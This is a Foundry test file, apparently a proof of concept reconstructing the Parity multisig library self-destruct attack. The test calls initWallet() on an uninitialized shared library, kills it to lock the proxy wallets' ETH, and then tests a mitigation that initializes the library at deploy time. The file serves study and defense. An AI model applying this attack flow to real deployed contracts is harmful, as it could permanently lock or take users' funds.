// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

/// @title Parity Multisig PoC — Library Self-Destruct
/// @notice Demonstrates the exact attack flow: initWallet() → kill() → all wallets bricked
contract ParityMultisigExploitTest is Test {
    WalletLibrary public library_;
    WalletProxy public walletA;
    WalletProxy public walletB;

    address public legitimateOwner = makeAddr("legitimateOwner");
    address public attacker = makeAddr("devops199"); // The actual GitHub user
    uint256 constant WALLET_A_BALANCE = 100 ether;
    uint256 constant WALLET_B_BALANCE = 200 ether;

    function setUp() public {
        // Deploy shared library (NOT initialized — this is the bug)
        library_ = new WalletLibrary();

        // Deploy two proxy wallets using this library
        walletA = new WalletProxy(address(library_));
        walletB = new WalletProxy(address(library_));

        // Initialize proxy wallets (this works correctly — delegatecall modifies proxy storage)
        address[] memory ownersA = new address[](1);
        ownersA[0] = legitimateOwner;
        walletA.initWallet(ownersA, 1);

        address[] memory ownersB = new address[](1);
        ownersB[0] = legitimateOwner;
        walletB.initWallet(ownersB, 1);

        // Fund wallets
        vm.deal(address(walletA), WALLET_A_BALANCE);
        vm.deal(address(walletB), WALLET_B_BALANCE);
    }

    function test_libraryIsUninitialized() public view {
        // The library contract itself was never initialized
        assertEq(library_.numOwners(), 0, "Library should have no owners");
    }

    function test_walletsWorkNormally() public {
        // Proxy wallets work fine via delegatecall
        assertEq(walletA.numOwners(), 1, "Wallet A should have 1 owner");
        assertEq(walletB.numOwners(), 1, "Wallet B should have 1 owner");
        assertEq(address(walletA).balance, WALLET_A_BALANCE);
        assertEq(address(walletB).balance, WALLET_B_BALANCE);
    }

    function test_exploit_initAndKillLibrary() public {
        // ===== STEP 1: Anyone can call initWallet() on the library =====
        address[] memory attackerOwners = new address[](1);
        attackerOwners[0] = attacker;

        vm.prank(attacker);
        library_.initWallet(attackerOwners, 1);

        // Attacker is now the owner of the LIBRARY contract
        assertEq(library_.numOwners(), 1, "Library now has an owner");
        assertEq(library_.owners(0), attacker, "Attacker is the owner");

        // ===== STEP 2: Kill the library =====
        vm.prank(attacker);
        library_.kill(payable(attacker));

        assertTrue(library_.killed(), "Library should be killed");

        emit log("Library killed — all dependent wallets are now bricked");

        // ===== STEP 3: Proxy wallets can no longer execute =====
        // The library's execute() will revert because killed = true
        // (In original, selfdestruct would make ALL delegatecalls return empty)

        // Total locked funds
        uint256 totalLocked = address(walletA).balance + address(walletB).balance;
        assertEq(totalLocked, WALLET_A_BALANCE + WALLET_B_BALANCE);

        emit log_named_decimal_uint("Total ETH locked forever", totalLocked, 18);
    }

    function test_exploit_cannotReinitialize() public {
        // Once initialized, initWallet() cannot be called again
        address[] memory owners = new address[](1);
        owners[0] = attacker;

        vm.prank(attacker);
        library_.initWallet(owners, 1);

        // Second call should revert
        address[] memory owners2 = new address[](1);
        owners2[0] = makeAddr("other");
        vm.expectRevert("already initialized");
        library_.initWallet(owners2, 1);
    }

    function test_mitigation_disableInitializers() public {
        // OpenZeppelin's pattern: constructor disables initialization
        // After applying this fix, initWallet() would revert immediately
        // because numOwners would be set to type(uint256).max in constructor

        // Verify: if library was initialized at deploy time, attack fails
        WalletLibrary fixedLibrary = new WalletLibrary();

        // Simulate fix: initialize the library in constructor
        address[] memory dummyOwners = new address[](1);
        dummyOwners[0] = address(1); // burn address
        fixedLibrary.initWallet(dummyOwners, 1);

        // Now attacker cannot initialize
        address[] memory attackerOwners = new address[](1);
        attackerOwners[0] = attacker;
        vm.prank(attacker);
        vm.expectRevert("already initialized");
        fixedLibrary.initWallet(attackerOwners, 1);
    }
}
